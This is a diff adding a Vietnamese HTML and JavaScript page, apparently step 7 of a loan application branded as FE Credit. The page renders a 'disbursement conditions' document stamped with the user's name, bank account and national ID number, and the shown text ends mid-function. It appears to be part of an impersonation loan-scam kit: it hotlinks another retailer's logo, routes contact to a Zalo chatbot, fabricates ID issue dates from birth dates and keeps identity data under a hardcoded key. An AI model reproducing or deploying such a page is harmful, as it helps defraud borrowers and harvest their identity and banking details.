@@ -1,0 +1,1292 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes, viewport-fit=cover" />
+    <title>Điều Kiện Giải Ngân - FE Credit</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@400;500;600;700&family=Roboto:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css"
+      rel="stylesheet"
+    />
+
+    <!-- Mobile UI Enhancement - NEW -->
+    <link rel="stylesheet" href="unified-design-system.css">
+    <link rel="stylesheet" href="mobile-accessibility.css">
+
+    <!-- Step 1 Style Guide -->
+    <link rel="stylesheet" href="step1-style-guide.css">
+
+    <style>
+      :root {
+        --primary-color: #2a83e9;
+        --primary-dark: #015C2E;
+        --primary-light: #9FE870;
+        --secondary-color: #f5f6f5;
+        --accent-color: #9FE870;
+      }
+
+      body {
+        font-family: 'Roboto', sans-serif;
+        font-size: 14px;
+        background-color: var(--secondary-color);
+        margin: 0;
+      }
+
+      /* FE Credit Header (giống step6) */
+      .fecredit-header {
+        background: #fff !important;
+        border-bottom: 1px solid #ECECEC;
+        position: sticky;
+        top: 0;
+        z-index: 1000;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        padding: 12px 0;
+      }
+
+      .fecredit-header .container-header {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 0 16px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+      }
+
+      .fecredit-header img {
+        height: 40px;
+        max-width: 200px;
+        object-fit: contain;
+      }
+
+      .header-icons {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+      }
+      .header-icons i {
+        font-size: 22px;
+        cursor: pointer;
+        color: #2a83e9;
+        transition: color 0.3s;
+      }
+      .header-icons i:hover {
+        color: var(--primary-light);
+      }
+
+      .container-main {
+        max-width: 90%;
+        width: 100%;
+        margin: 0 auto;
+        padding: 20px;
+        background: white;
+        border-radius: 8px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        position: relative;
+      }
+      @media (min-width: 768px) {
+        .container-main {
+          max-width: 700px;
+          margin: 20px auto;
+        }
+      }
+
+      .nav-tabs {
+        display: flex;
+        justify-content: space-around;
+        margin-bottom: 20px;
+        margin-top: 0;
+        flex-wrap: nowrap;
+        overflow-x: auto;
+        white-space: nowrap;
+        -webkit-overflow-scrolling: touch;
+      }
+      .nav-tabs .nav-item {
+        flex: 1;
+        text-align: center;
+      }
+      .nav-tabs .nav-link {
+        background-color: #d3d3d3;
+        color: #ffffff;
+        border-radius: 20px;
+        padding: 10px 16px;
+        font-weight: 500;
+        font-size: 13px;
+        width: 100%;
+        margin: 0 4px;
+        transition: background-color 0.3s;
+      }
+      .nav-tabs .nav-link.active {
+        background-color: var(--primary-color);
+        color: #ffffff;
+      }
+      .nav-tabs .nav-link:hover {
+        background-color: var(--primary-light);
+        color: var(--primary-dark);
+      }
+
+      @media (max-width: 767px) {
+        .nav-tabs .nav-link {
+          font-size: 11px;
+          padding: 8px 10px;
+        }
+        .container-main {
+          max-width: 100% !important;
+          width: 100% !important;
+          padding: 16px !important;
+          margin: 0 !important;
+        }
+      }
+
+      .step-title {
+        color: var(--primary-color);
+        font-size: 20px;
+        font-weight: 700;
+        margin-bottom: 16px;
+        text-transform: uppercase;
+        text-align: center;
+      }
+      .step-description {
+        font-size: 14px;
+        text-align: center;
+        margin-bottom: 16px;
+        color: #1a3c87;
+      }
+
+      .image-section {
+        text-align: center;
+        margin: 16px 0;
+      }
+      /* Image overlay container - position: relative để chứa các text overlay */
+      .image-overlay-container {
+        position: relative;
+        margin: 16px auto;
+        max-width: 100%;
+        width: 100%;
+        display: inline-block;
+      }
+
+      /* Ảnh nền điều kiện giải ngân */
+      .disbursement-image {
+        width: 100%;
+        max-width: 100%;
+        height: auto;
+        display: block;
+        border: 2px solid #e9ecef;
+        border-radius: 8px;
+        background-color: #ffffff;
+      }
+
+      .disbursement-image.loading {
+        opacity: 0.5;
+        background-color: #f1f1f1;
+      }
+
+      /* Text overlay base styles - position: absolute để đè lên ảnh */
+      .text-overlay {
+        position: absolute;
+        z-index: 10;
+        font-family: 'Be Vietnam Pro', 'Roboto', Arial, sans-serif;
+        font-weight: 600;
+        color: #000000;
+        white-space: nowrap;
+        pointer-events: none;
+      }
+
+      /* Các vị trí text overlay cụ thể (tính theo % để responsive) */
+      /* Tham chiếu từ step7_fixed.html với canvas 1240 x 1754 px */
+      
+      /* Loan Code - Vị trí góc trên bên trái */
+      .text-overlay.loan-code-1 {
+        top: 3.42%;   /* 60/1754 = 3.42% */
+        left: 17.02%; /* 211/1240 = 17.02% */
+        font-size: clamp(8px, 1.8vw, 22px);
+      }
+      
+      .text-overlay.loan-code-2 {
+        top: 5.53%;   /* 97/1754 = 5.53% */
+        left: 17.02%; /* 211/1240 = 17.02% */
+        font-size: clamp(8px, 1.8vw, 22px);
+      }
+
+      /* Account Number - Số tài khoản */
+      .text-overlay.account-number {
+        top: 18.36%;  /* 322/1754 = 18.36% */
+        left: 34.11%; /* 423/1240 = 34.11% */
+        font-size: clamp(7px, 1.6vw, 20px);
+      }
+
+      /* Full Name - Tên đầy đủ (xuất hiện 2 lần) */
+      .text-overlay.full-name-1 {
+        top: 20.18%;  /* 354/1754 = 20.18% */
+        left: 34.60%; /* 429/1240 = 34.60% */
+        font-size: clamp(7px, 1.6vw, 23px);
+        max-width: 50%;
+        overflow: hidden;
+        text-overflow: ellipsis;
+      }
+
+      /* Bank Name - Tên ngân hàng */
+      .text-overlay.bank-name {
+        top: 22.24%;  /* 390/1754 = 22.24% */
+        left: 34.11%; /* 423/1240 = 34.11% */
+        font-size: clamp(6px, 1.4vw, 18px);
+        max-width: 50%;
+        overflow: hidden;
+        text-overflow: ellipsis;
+      }
+
+      /* Full Name 2 - Tên đầy đủ lần 2 */
+      .text-overlay.full-name-2 {
+        top: 25.31%;  /* 444/1754 = 25.31% */
+        left: 34.60%; /* 429/1240 = 34.60% */
+        font-size: clamp(7px, 1.6vw, 23px);
+      }
+
+      /* CCCD - Số căn cước công dân */
+      .text-overlay.cccd {
+        top: 27.77%;  /* 487/1754 = 27.77% */
+        left: 34.11%; /* 423/1240 = 34.11% */
+        font-size: clamp(7px, 1.6vw, 20px);
+      }
+
+      /* ID Issue Date - Ngày cấp */
+      .text-overlay.id-issue-date {
+        top: 27.77%;  /* 487/1754 = 27.77% */
+        left: 57.02%; /* 707/1240 = 57.02% */
+        font-size: clamp(6px, 1.4vw, 18px);
+      }
+
+      /* ID Issue Place - Nơi cấp */
+      .text-overlay.id-issue-place {
+        top: 27.77%;  /* 487/1754 = 27.77% */
+        left: 76.77%; /* 952/1240 = 76.77% */
+        font-size: clamp(5px, 1.2vw, 14px);
+        max-width: 20%;
+        overflow: hidden;
+        text-overflow: ellipsis;
+      }
+
+      /* Canvas container giữ cho backward compatibility */
+      .canvas-container {
+        position: relative;
+        margin: 16px auto;
+        max-width: 100%;
+        width: 100%;
+        overflow-x: auto;
+        -webkit-overflow-scrolling: touch;
+        text-align: center;
+      }
+
+      #disbursementCanvas {
+        width: 100%;
+        max-width: 100%;
+        height: auto;
+        display: none; /* Ẩn canvas, sử dụng image overlay thay thế */
+        border: 2px solid #e9ecef;
+        border-radius: 8px;
+        image-rendering: -webkit-optimize-contrast;
+        image-rendering: crisp-edges;
+        background-color: #ffffff;
+      }
+
+      @media (max-width: 768px) {
+        .canvas-container {
+          margin: 12px 0;
+          padding: 0 8px;
+        }
+        .image-overlay-container {
+          margin: 12px 0;
+        }
+        .disbursement-image {
+          max-width: calc(100vw - 32px);
+          border-radius: 4px;
+        }
+        /* Điều chỉnh font size cho mobile */
+        .text-overlay {
+          font-weight: 500;
+        }
+        .text-overlay.loan-code-1,
+        .text-overlay.loan-code-2 {
+          font-size: 8px;
+        }
+        .text-overlay.account-number,
+        .text-overlay.full-name-1,
+        .text-overlay.full-name-2,
+        .text-overlay.cccd {
+          font-size: 7px;
+        }
+        .text-overlay.bank-name,
+        .text-overlay.id-issue-date {
+          font-size: 6px;
+        }
+        .text-overlay.id-issue-place {
+          font-size: 5px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .text-overlay {
+          font-size: 5px !important;
+          font-weight: 400;
+        }
+        .text-overlay.loan-code-1,
+        .text-overlay.loan-code-2 {
+          font-size: 6px !important;
+        }
+      }
+
+      #disbursementCanvas.loading {
+        opacity: 0.5;
+        background-color: #f1f1f1;
+      }
+
+      .btn-download {
+        background-color: #17a2b8;
+        color: white;
+        font-size: 14px;
+        font-weight: 700;
+        padding: 12px 20px;
+        border-radius: 20px;
+        transition: all 0.3s ease;
+        border: none;
+        cursor: pointer;
+      }
+      .btn-download:hover {
+        background-color: var(--primary-color);
+      }
+
+      .btn-primary {
+        background-color: var(--primary-color);
+        border: none;
+        border-radius: 20px;
+        padding: 12px 20px;
+        font-weight: 700;
+        font-size: 14px;
+        transition: all 0.3s ease;
+        margin: 4px;
+        cursor: pointer;
+      }
+      .btn-primary:hover {
+        background-color: var(--primary-dark);
+        box-shadow: 0 4px 12px rgba(0, 153, 79, 0.3);
+      }
+
+      .btn-secondary {
+        background-color: #6c757d;
+        color: white;
+        border: none;
+        border-radius: 20px;
+        padding: 12px 20px;
+        font-weight: 700;
+        font-size: 14px;
+        transition: all 0.3s ease;
+        margin: 4px;
+        cursor: pointer;
+      }
+      .btn-secondary:hover {
+        background-color: #5a6268;
+      }
+
+      .button-group {
+        display: flex;
+        justify-content: center;
+        gap: 12px;
+        margin-top: 16px;
+        flex-wrap: wrap;
+      }
+      @media (max-width: 767px) {
+        .button-group {
+          flex-direction: row;
+          justify-content: center;
+          flex-wrap: nowrap;
+          gap: 8px;
+        }
+        .button-group a, .button-group button {
+          flex: 1;
+          text-align: center;
+          padding: 10px 8px;
+          font-size: 12px;
+          min-height: 44px;
+        }
+      }
+
+      .divider-blue {
+        border-top: 1px solid #b3cde0;
+        margin: 16px 0;
+      }
+
+      .error-message {
+        color: #ff4d4f;
+        font-size: 13px;
+        font-weight: 500;
+        text-align: center;
+        margin-top: 8px;
+        padding: 8px;
+        background-color: #ffe6e6;
+        border-radius: 5px;
+        display: none;
+      }
+      .test-mode-banner {
+        background-color: #fff3cd;
+        color: #856404;
+        border: 1px solid #ffc107;
+        border-radius: 5px;
+        padding: 10px 12px;
+        margin-bottom: 12px;
+        text-align: center;
+        font-size: 13px;
+        font-weight: 500;
+        display: none;
+      }
+      .test-mode-banner i {
+        margin-right: 6px;
+      }
+      .canvas-loading-overlay {
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: rgba(255, 255, 255, 0.95);
+        padding: 16px 24px;
+        border-radius: 8px;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        display: none;
+        z-index: 10;
+      }
+      .canvas-loading-overlay.show {
+        display: block;
+      }
+      .spinner {
+        border: 3px solid #f3f3f3;
+        border-top: 3px solid #2a83e9;
+        border-radius: 50%;
+        width: 30px;
+        height: 30px;
+        animation: spin 1s linear infinite;
+        margin: 0 auto 10px;
+      }
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      .btn-download .spinner-small {
+        display: inline-block;
+        width: 14px;
+        height: 14px;
+        border: 2px solid #ffffff;
+        border-top: 2px solid transparent;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+        margin-right: 8px;
+        vertical-align: middle;
+      }
+
+      .footer {
+        text-align: center;
+        padding: 16px;
+        background-color: var(--primary-color);
+        color: white;
+        margin-top: 16px;
+        font-size: 12px;
+      }
+      .footer-links a {
+        color: #b3cde0;
+        margin: 0 8px;
+        text-decoration: none;
+        transition: color 0.3s;
+      }
+      .footer-links a:hover {
+        color: var(--primary-light);
+      }
+    </style>
+  </head>
+  <body>
+    <!-- FE Credit Header giống step6 -->
+    <header class="fecredit-header">
+      <div class="container-header">
+        <div style="flex: 0 0 auto;">
+          <a href="../index.html" title="FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP" style="display: flex; align-items: center; text-decoration: none;">
+            <img src="https://thuvienvector.vn/wp-content/uploads/2025/08/dien-may-xanh-logo-png.jpg" alt="FE CREDIT Logo" 
+                 style="object-fit: contain; height: 40px; max-width: 200px;">
+            <span style="margin-left: 10px; font-size: 14px; font-weight: 600; color: #2a83e9; display: none;" class="logo-text">
+              FE CREDIT - VAY TIÊU DÙNG TÍN CHẤP
+            </span>
+          </a>
+        </div>
+        <div class="header-icons">
+          <i class="bi bi-search"></i>
+          <div class="dropdown">
+            <i
+              class="bi bi-list"
+              data-bs-toggle="dropdown"
+              aria-expanded="false"
+            ></i>
+            <ul class="dropdown-menu dropdown-menu-end">
+              <li>
+                <a class="dropdown-item" href="loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a>
+              </li>
+              <li>
+                <a class="dropdown-item" href="#footer">LIÊN HỆ</a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <hr class="divider-blue" style="margin: 0" />
+
+    <div class="container-main">
+      <!-- Tabs giống step6 -->
+      <ul class="nav nav-tabs">
+        <li class="nav-item">
+          <a class="nav-link" href="step1.html">1. Nhập thông tin</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link" href="step4.html">2. Xác thực và xử lý</a>
+        </li>
+        <li class="nav-item">
+          <a class="nav-link active" href="step7.html">3. Hoàn thành</a>
+        </li>
+      </ul>
+
+      <section id="step7" class="step-transition">
+        <h5 class="step-title">Điều Kiện Giải Ngân</h5>
+        <div class="test-mode-banner" id="testModeBanner">
+          <i class="bi bi-exclamation-triangle-fill"></i>
+          <span>Đang chạy chế độ kiểm thử (Test Mode)</span>
+        </div>
+        <div class="error-message" id="formError"></div>
+        <p class="step-description">
+          Dưới đây là các điều kiện giải ngân của khoản vay. Vui lòng kiểm tra kỹ thông tin.
+        </p>
+        <div class="image-section">
+          <div class="canvas-container">
+            <div class="canvas-loading-overlay" id="canvasLoadingOverlay">
+              <div class="spinner"></div>
+              <div style="text-align: center; color: #2a83e9; font-weight: 500;">Đang tải điều kiện giải ngân...</div>
+            </div>
+            
+            <!-- Image Overlay Container: position: relative để chứa các text overlay -->
+            <div class="image-overlay-container" id="imageOverlayContainer">
+              <!-- Ảnh nền điều kiện giải ngân -->
+              <img 
+                id="disbursementImage" 
+                class="disbursement-image loading" 
+                src="" 
+                alt="Điều kiện giải ngân"
+                aria-label="Điều kiện giải ngân"
+              />
+              
+              <!-- Text overlay với position: absolute và z-index cao -->
+              <span class="text-overlay loan-code-1" id="overlayLoanCode1"></span>
+              <span class="text-overlay loan-code-2" id="overlayLoanCode2"></span>
+              <span class="text-overlay account-number" id="overlayAccountNumber"></span>
+              <span class="text-overlay full-name-1" id="overlayFullName1"></span>
+              <span class="text-overlay bank-name" id="overlayBankName"></span>
+              <span class="text-overlay full-name-2" id="overlayFullName2"></span>
+              <span class="text-overlay cccd" id="overlayCccd"></span>
+              <span class="text-overlay id-issue-date" id="overlayIdIssueDate"></span>
+              <span class="text-overlay id-issue-place" id="overlayIdIssuePlace"></span>
+            </div>
+            
+            <!-- Canvas ẩn - dùng cho tải PDF -->
+            <canvas id="disbursementCanvas" aria-label="Điều kiện giải ngân" style="display: none;"></canvas>
+          </div>
+        </div>
+        <hr class="divider-blue" />
+        <div class="button-group">
+          <a href="step6.html" class="btn btn-secondary">HỢP ĐỒNG VAY</a>
+          <button id="downloadDisbursementBtn" class="btn btn-download" disabled>
+            TẢI XUỐNG
+          </button>
+          <button
+            id="proceedToFinalStepBtn"
+            type="button"
+            class="btn btn-primary"
+            data-next-url="step8.html"
+          >
+            TIẾP TỤC
+          </button>
+        </div>
+      </section>
+    </div>
+
+    <div class="footer" id="footer">
+      <div class="footer-links">
+        <a href="chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
+        <a href="dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
+        <a href="https://chatbot.zalo.me/ref/3932037504673339016?id=kichhoattuvan">Liên hệ</a>
+      </div>
+      <p class="mt-3">© 2025 FE CREDIT BANK VIETNAM ALL RIGHTS RESERVED.</p>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+    <script>
+      // =====================================================================
+      // PHẦN 1: LOGIC LƯU VỊ TRÍ - Save current step on page load
+      // =====================================================================
+      // Lưu vị trí hiện tại ngay khi trang tải
+      localStorage.setItem('currentStep', 'step7.html');
+
+      // =====================================================================
+      // STEP 7: ĐIỀU KIỆN GIẢI NGÂN - BUSINESS LOGIC (IMPROVED VERSION)
+      // Yêu cầu tải tài liệu trước khi tiếp tục
+      // =====================================================================
+      
+      const ENCRYPTION_KEY = "fecredit-secret-key-v1";
+      // Primary URL (CDN) with local fallback
+      const DISBURSEMENT_IMAGE_URL = "/assets/img/dieukiengiayngan.png";
+      const DISBURSEMENT_IMAGE_FALLBACK = "../assets/img/dieukiengiayngan.png";
+      
+      let userData = {};
+      let isTestMode = false;
+      
+      // =====================================================================
+      // UTILITY FUNCTIONS
+      // =====================================================================
+      
+      /**
+       * Chuyển đổi mã ngân hàng thành tên đầy đủ
+       */
+      function getBankFullName(bankCode) {
+        // Độ dài tối thiểu để phân biệt giữa mã code (ngắn) và tên đầy đủ (dài)
+        const MIN_FULL_NAME_LENGTH = 20;
+        const bankMap = {
+          'shinhan': 'Ngân hàng Shinhan Việt Nam (Shinhanbank)',
+          'vietcombank': 'Ngân hàng TMCP Ngoại Thương Việt Nam (Vietcombank)',
+          'vietinbank': 'Ngân hàng TMCP Công Thương Việt Nam (VietinBank)',
+          'bidv': 'Ngân hàng TMCP Đầu tư và Phát triển Việt Nam (BIDV)',
+          'techcombank': 'Ngân hàng TMCP Kỹ Thương Việt Nam (Techcombank)',
+          'agribank': 'Ngân hàng Nông nghiệp và Phát triển Nông thôn Việt Nam (Agribank)',
+          'mbbank': 'Ngân hàng TMCP Quân đội (MB Bank)',
+          'vpbank': 'Ngân hàng TMCP Việt Nam Thịnh Vượng (VPBank)',
+          'acb': 'Ngân hàng TMCP Á Châu (ACB)',
+          'sacombank': 'Ngân hàng TMCP Sài Gòn Thương Tín (Sacombank)'
+        };
+        
+        if (!bankCode) return '';
+        
+        // Nếu đã là tên đầy đủ, trả về luôn
+        if (bankCode.length > MIN_FULL_NAME_LENGTH) return bankCode;
+        
+        // Nếu là mã code, chuyển đổi
+        return bankMap[bankCode.toLowerCase()] || bankCode;
+      }
+      
+      /**
+       * Tính ngày cấp CCCD từ ngày sinh + 18 năm (format dd/mm/yyyy)
+       */
+      function calculateIdIssueDate(dob) {
+        if (!dob) return '';
+        
+        // Constants for date validation
+        const MAX_DAY = 31;
+        const MAX_MONTH = 12;
+        const MIN_YEAR = 1900;
+        const ID_ISSUE_AGE = 18;
+        
+        try {
+          // Parse dob (có thể là dd/mm/yyyy hoặc yyyy-mm-dd)
+          let day, month, year;
+          
+          if (dob.includes('/')) {
+            // Format dd/mm/yyyy
+            const parts = dob.split('/');
+            day = parseInt(parts[0], 10);
+            month = parseInt(parts[1], 10);
+            year = parseInt(parts[2], 10);
+          } else if (dob.includes('-')) {
+            // Format yyyy-mm-dd
+            const parts = dob.split('-');
+            year = parseInt(parts[0], 10);
+            month = parseInt(parts[1], 10);
+            day = parseInt(parts[2], 10);
+          } else {
+            return '';
+          }
+          
+          // Kiểm tra tính hợp lệ
+          if (!day || !month || !year || 
+              day < 1 || day > MAX_DAY || 
+              month < 1 || month > MAX_MONTH || 
+              year < MIN_YEAR) {
+            return '';
+          }
+          
+          // Cộng 18 năm
+          const issueYear = year + ID_ISSUE_AGE;
+          
+          // Format dd/mm/yyyy
+          const dayStr = day.toString().padStart(2, '0');
+          const monthStr = month.toString().padStart(2, '0');
+          
+          return `${dayStr}/${monthStr}/${issueYear}`;
+        } catch (error) {
+          console.error('Lỗi tính ngày cấp:', error);
+          return '';
+        }
+      }
+      
+      /**
+       * Tạo dữ liệu giả để test (Mock Data)
+       * @deprecated Không sử dụng mock data nữa, chỉ dùng dữ liệu thật
+       */
+      function createMockData() {
+        // Mock data đã bị vô hiệu hóa
+        return null;
+      }
+      
+      /**
+       * Load và giải mã userData từ localStorage
+       */
+      function loadUserData() {
+        try {
+          const encryptedData = localStorage.getItem("userData");
+          if (!encryptedData) {
+            console.error("Không tìm thấy dữ liệu trong localStorage");
+            showError("Không tìm thấy dữ liệu người dùng. Vui lòng quay lại bước 1 để nhập thông tin.");
+            disableButtons();
+            return false;
+          }
+          
+          const decryptedBytes = CryptoJS.AES.decrypt(encryptedData, ENCRYPTION_KEY);
+          const decryptedText = decryptedBytes.toString(CryptoJS.enc.Utf8);
+          
+          if (!decryptedText) {
+            console.error("Giải mã thất bại - Khóa mã hóa không đúng");
+            showError("Không thể đọc dữ liệu người dùng. Vui lòng quay lại bước 1 để nhập lại thông tin.");
+            disableButtons();
+            return false;
+          }
+          
+          userData = JSON.parse(decryptedText);
+          
+          // Kiểm tra dữ liệu cần thiết
+          if (!userData.isRegistered || !userData.fullName) {
+            console.error("Dữ liệu không hợp lệ hoặc thiếu thông tin bắt buộc");
+            showError("Dữ liệu không đầy đủ. Vui lòng quay lại bước 1 để nhập đầy đủ thông tin.");
+            disableButtons();
+            return false;
+          }
+          
+          // Ánh xạ các trường dữ liệu
+          // idIssuePlace được lấy từ issuePlace
+          if (userData.issuePlace && !userData.idIssuePlace) {
+            userData.idIssuePlace = userData.issuePlace;
+          }
+          
+          // Chuyển đổi bankName từ code sang tên đầy đủ
+          if (userData.bankName) {
+            userData.bankName = getBankFullName(userData.bankName);
+          }
+          
+          // idIssueDate - nếu không có thì tạo từ dob + 18 năm
+          if (!userData.idIssueDate && userData.dob) {
+            userData.idIssueDate = calculateIdIssueDate(userData.dob);
+          } else if (!userData.idIssueDate) {
+            userData.idIssueDate = "";
+          }
+          
+          isTestMode = false;
+          return true;
+        } catch (error) {
+          console.error("Lỗi giải mã dữ liệu:", error);
+          showError("Lỗi đọc dữ liệu: " + error.message + ". Vui lòng quay lại bước 1.");
+          disableButtons();
+          return false;
+        }
+      }
+      
+      /**
+       * Hiển thị banner Test Mode
+       */
+      function showTestModeBanner() {
+        $("#testModeBanner").show();
+      }
+      
+      /**
+       * Lưu userData vào localStorage (có mã hóa)
+       */
+      function saveUserData() {
+        try {
+          // Không lưu trong test mode
+          if (isTestMode) {
+            console.log("Test Mode: Bỏ qua lưu dữ liệu vào localStorage");
+            return true;
+          }
+          
+          const encryptedData = CryptoJS.AES.encrypt(
+            JSON.stringify(userData),
+            ENCRYPTION_KEY
+          ).toString();
+          localStorage.setItem("userData", encryptedData);
+          return true;
+        } catch (error) {
+          console.error("Lỗi lưu dữ liệu:", error);
+          showError("Lỗi lưu dữ liệu. Vui lòng thử lại.");
+          return false;
+        }
+      }
+      
+      /**
+       * Hiển thị thông báo lỗi
+       */
+      function showError(message) {
+        const errorElement = $("#formError");
+        errorElement.css({
+          "background-color": "#ffe6e6",
+          "color": "#ff4d4f"
+        }).text(message).show();
+      }
+      
+      /**
+       * Ẩn thông báo lỗi
+       */
+      function hideError() {
+        $("#formError").hide().text("");
+      }
+      
+      /**
+       * Hiển thị thông báo thành công
+       */
+      function showSuccess(message) {
+        const errorElement = $("#formError");
+        errorElement.css({
+          "background-color": "#d4edda",
+          "color": "#155724"
+        }).text(message).show();
+        
+        // Tự động ẩn sau 3 giây
+        setTimeout(() => {
+          errorElement.css({
+            "background-color": "#ffe6e6",
+            "color": "#ff4d4f"
+          }).hide();
+        }, 3000);
+      }
+      
+      /**
+       * Disable các nút action
+       */
+      function disableButtons() {
+        $("#downloadDisbursementBtn").prop("disabled", true);
+        // Không disable nút tiếp tục nữa
+      }
+      
+      /**
+       * Enable nút download
+       */
+      function enableDownloadButton() {
+        $("#downloadDisbursementBtn").prop("disabled", false);
+      }
+      
+      /**
+       * Enable nút tiếp tục (không cần gọi, đã enable sẵn)
+       */
+      function enableProceedButton() {
+        $("#proceedToFinalStepBtn").prop("disabled", false);
+      }
+      
+      /**
+       * Hiển thị loading overlay trên canvas
+       */
+      function showCanvasLoading() {
+        $("#canvasLoadingOverlay").addClass("show");
+      }
+      
+      /**
+       * Ẩn loading overlay trên canvas
+       */
+      function hideCanvasLoading() {
+        $("#canvasLoadingOverlay").removeClass("show");
+      }
+      
+      // =====================================================================
+      // IMAGE OVERLAY RENDERING
+      // =====================================================================
+      
+      /**
+       * Cập nhật các text overlay với dữ liệu user
+       */
+      function updateTextOverlays() {
+        // Lấy giá trị sanitized từ userData
+        const loanCode = sanitizeValue(userData.loanCode);
+        const accountNumber = sanitizeValue(userData.accountNumber);
+        const fullName = sanitizeValue(userData.fullName);
+        const bankName = normalizeBankName(userData.bankName);
+        const cccd = sanitizeValue(userData.cccd);
+        const idIssueDate = sanitizeValue(userData.idIssueDate);
+        const idIssuePlace = sanitizeValue(userData.idIssuePlace);
+        
+        // Cập nhật các text overlay
+        $("#overlayLoanCode1").text(loanCode);
+        $("#overlayLoanCode2").text(loanCode);
+        $("#overlayAccountNumber").text(accountNumber);
+        $("#overlayFullName1").text(fullName);
+        $("#overlayBankName").text(bankName);
+        $("#overlayFullName2").text(fullName);
+        $("#overlayCccd").text(cccd);
+        $("#overlayIdIssueDate").text(idIssueDate);
+        $("#overlayIdIssuePlace").text(idIssuePlace);
+      }
+      
+      /**
+       * Sanitize giá trị - loại bỏ các giá trị không hợp lệ
+       */
+      function sanitizeValue(value) {
+        if (value === null || value === undefined) return "";
+        if (typeof value === "number") {
+          return Number.isFinite(value) && value !== 0 ? String(value) : "";
+        }
+        if (typeof value === "string") {
+          const trimmed = value.trim();
+          if (!trimmed) return "";
+          const upper = trimmed.toUpperCase();
+          if (upper === "N/A" || upper === "NULL" || upper === "UNDEFINED") {
+            return "";
+          }
+          return trimmed;
+        }
+        return "";
+      }
+      
+      /**
+       * Normalize tên ngân hàng - sử dụng getBankFullName để chuyển đổi
+       */
+      function normalizeBankName(raw) {
+        const value = sanitizeValue(raw);
+        if (!value) return "";
+        
+        // Chuyển đổi từ code sang tên đầy đủ
+        const fullName = getBankFullName(value);
+        
+        // Loại bỏ khoảng trắng thừa
+        return fullName.replace(/\s+/g, " ");
+      }
+      
+      /**
+       * Render hình ảnh điều kiện giải ngân vào img element và cập nhật text overlays
+       */
+      function renderImageOverlay() {
+        const imgElement = document.getElementById("disbursementImage");
+        const canvas = document.getElementById("disbursementCanvas");
+        
+        if (!imgElement) {
+          showError("Không tìm thấy khu vực hiển thị điều kiện giải ngân.");
+          return;
+        }
+        
+        // Hiển thị loading
+        showCanvasLoading();
+        imgElement.classList.add("loading");
+        
+        // Biến để track việc thử fallback và lưu trữ image object cho canvas
+        let triedFallback = false;
+        let loadedImage = null;
+        
+        const handleImageLoad = function() {
+          hideCanvasLoading();
+          imgElement.classList.remove("loading");
+          
+          // Tạo image object từ imgElement để dùng cho canvas
+          loadedImage = new Image();
+          loadedImage.crossOrigin = "anonymous";
+          // Thiết lập onload handler TRƯỚC KHI set src để tránh race condition
+          loadedImage.onload = function() {
+            // Render canvas ẩn cho việc tải PDF
+            renderCanvasForPDF(loadedImage);
+          };
+          // Set src SAU KHI đã thiết lập handler
+          loadedImage.src = imgElement.src;
+          
+          // Cập nhật text overlays với dữ liệu user
+          updateTextOverlays();
+          
+          // Enable download button khi load xong
+          enableDownloadButton();
+          
+          // Nếu đã tải trước đó, enable luôn nút tiếp tục
+          if (userData.isDisbursementDownloaded) {
+            enableProceedButton();
+          }
+        };
+        
+        const handleImageError = function() {
+          // Nếu chưa thử fallback, thử load từ local
+          if (!triedFallback) {
+            triedFallback = true;
+            console.log("Primary image URL failed, trying fallback...");
+            imgElement.src = DISBURSEMENT_IMAGE_FALLBACK;
+          } else {
+            // Nếu cả primary và fallback đều fail
+            hideCanvasLoading();
+            imgElement.classList.remove("loading");
+            showError("Không thể tải hình ảnh điều kiện giải ngân. Vui lòng thử lại sau.");
+            disableButtons();
+          }
+        };
+        
+        // Thiết lập event handlers cho imgElement
+        imgElement.onload = handleImageLoad;
+        imgElement.onerror = handleImageError;
+        
+        // Bắt đầu load ảnh trực tiếp vào imgElement
+        imgElement.src = DISBURSEMENT_IMAGE_URL;
+      }
+      
+      /**
+       * Render canvas ẩn với text overlays cho việc tải PDF
+       */
+      function renderCanvasForPDF(image) {
+        const canvas = document.getElementById("disbursementCanvas");
+        if (!canvas) return;
+        
+        const ctx = canvas.getContext("2d");
+        
+        // Set canvas size (dựa trên tỉ lệ gốc của step7_fixed.html)
+        canvas.width = 1240;
+        canvas.height = 1754;
+        
+        // Draw image
+        ctx.drawImage(image, 0, 0, canvas.width, canvas.height);
+        
+        // Draw text overlays lên canvas (giống step7_fixed.html)
+        const fields = buildCanvasFields();
+        fields.forEach(field => {
+          if (!field.value) return;
+          ctx.font = field.font;
+          ctx.fillStyle = field.color;
+          ctx.fillText(field.value, field.x, field.y);
+        });
+      }
+      
+      /**
+       * Build danh sách các fields để vẽ lên canvas (dựa trên step7_fixed.html)
+       */
+      function buildCanvasFields() {
